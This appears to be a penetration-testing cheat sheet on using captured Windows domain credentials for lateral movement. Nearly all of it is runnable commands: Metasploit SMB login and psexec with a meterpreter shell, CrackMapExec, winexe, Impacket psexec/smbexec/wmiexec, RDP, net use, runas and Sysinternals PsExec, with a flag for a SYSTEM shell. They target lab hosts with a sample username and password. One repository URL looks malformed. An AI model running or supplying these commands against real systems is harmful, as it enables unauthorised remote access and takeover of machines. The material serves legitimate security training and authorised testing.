# Windows - Using credentials

## Metasploit - SMB
```c
use auxiliary/scanner/smb/smb_login  
set SMBDomain CSCOU  
set SMBUser jarrieta
set SMBPass nastyCutt3r
services -p 445 -R  
run
creds
```

## Metasploit - Psexec
```c
use exploit/windows/smb/psexec
set RHOST 10.2.0.3
set SMBUser jarrieta
set SMBPass nastyCutt3r
set PAYLOAD windows/meterpreter/bind_tcp
run
shell
```

## Crackmapexec (Integrated to Kali)
```python
git clone https://github.com/byt3bl33d3r/CrackMapExec.github
python crackmapexec.py 10.9.122.0/25 -d CSCOU -u jarrieta -p nastyCutt3r
python crackmapexec.py 10.9.122.5 -d CSCOU -u jarrieta -p nastyCutt3r -x whoami
```

## Winexe (Integrated to Kali)
```python
winexe -U CSCOU/jarrieta%nastyCutt3r //10.9.122.5 cmd.exe
```

## Psexec.py / Smbexec.py / Wmiexec.py (Impacket)
```python
git clone https://github.com/CoreSecurity/impacket.git
python psexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
python smbexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
python wmiexec.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
```

## RDP Remote Desktop Protocol (Impacket)
```
python rdpcheck.py CSCOU/jarrieta:nastyCutt3r@10.9.122.5
rdesktop -d CSCOU -u jarrieta -p nastyCutt3r 10.9.122.5
```

## Netuse (Windows)
```
net use \\ordws01.cscou.lab /user:CSCOU\jarrieta nastyCutt3r
C$
```

## Runas (Windows - Kerberos auth)
```
runas /netonly /user:CSCOU\jarrieta "cmd.exe"
```

## PsExec (Windows - [Sysinternal](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) )
```
PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe
PsExec.exe  \\ordws01.cscou.lab -u CSCOU\jarrieta -p nastyCutt3r cmd.exe -s  # get System shell
```

## Thanks
 - [Ropnop - Using credentials to own Windows boxes](https://blog.ropnop.com/using-credentials-to-own-windows-boxes/)
- [Ropnop - Using credentials to own Windows boxes Part 2](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
